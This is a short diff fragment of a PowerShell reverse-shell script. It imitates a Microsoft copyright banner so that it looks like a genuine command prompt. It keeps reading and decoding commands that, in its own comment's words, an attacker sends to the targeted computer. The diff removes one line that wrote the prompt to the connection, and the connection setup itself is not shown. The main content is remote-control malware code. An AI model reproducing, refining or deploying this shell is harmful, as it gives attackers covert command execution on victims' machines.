@@ -12,7 +12,6 @@ $U = ([text.encoding]::ASCII).getBytes("Copyright (C) 2021 Microsoft Corporation
 $I.Write($U,0,$U.Length)
 # Get location of Path Directory and encode in ASCII
 $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
-$I.Write($U,0,$U.Length)
 # While the attacker is still sending commands to the targeted computer keep the connection
 while(($k = $I.Read($U, 0, $U.Length)) -ne 0) {
   ;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
